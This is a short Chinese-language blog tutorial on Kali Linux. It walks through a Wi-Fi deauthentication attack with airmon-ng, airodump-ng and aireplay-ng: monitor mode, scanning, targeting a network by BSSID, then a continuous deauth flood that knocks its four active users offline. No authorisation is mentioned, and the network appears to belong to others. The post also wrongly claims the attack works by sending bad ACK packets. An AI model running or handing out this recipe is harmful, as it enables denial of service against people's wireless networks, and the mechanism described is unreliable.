---
title: Aireplay Wi-Fi攻击
date: 2022-03-28 12:12:43
tags:
---

## 前期准备
	Kaili虚拟机
	带监听功能的无线网卡

## 调试网卡
	进入Kaili虚拟机
	插上网卡
	打开终端 测试当前的网卡状态
		iwconfig
 ![](/images/网卡状态1.png)
<!--more-->
	可以看到 Mode:Manage 代表并未开启监听模式 (monitor)
	输入开启指令	
		sudo airmon-ng start wlan0
	再次查看
		iwconfig
 ![](/images/网卡状态2.png)

	可以看到 Mode:Monitor 代表已经开启监听模式

## 攻击过程
	扫描Wi-Fi频段
		sudo airodump-ng wlan0mon 
 ![](/images/扫描.png)      

	可以看到 扫描出了很多Wi-Fi频段
	BSSID-路由器mac地址	STATION-用户mac地址	CH-通信通道	PWR-信号强度
	下方活跃的目标作为选择的攻击对象 这里我们依靠BSSID 选择8848作为攻击对象
		当有合适的目标出现后
			control + C 退出扫描
	单独对8848监听		
		sudo airodump-ng -w hack -c 2 --bssid 50:0F:F5:EF:BC:51 wlan0mon
						-w 保存的文件名 -c 通信通道 
 ![](/images/单独扫描.png)    

	可以看到 STATION下方有四个活跃的用户在使用
	开始攻击 让用户强制下线 无法连接上WIFI
		sudo aireplay-ng --deauth 0 -a 50:0F:F5:EF:BC:51 -c 5E:27:66:91:5F:FC wlan0mon
 ![](/images/攻击.png)

	通过不断得发送错误的ACK响应包 让用户强制下线 达到攻击的效果
 ![](/images/攻击效果.jpeg)





















 											

	


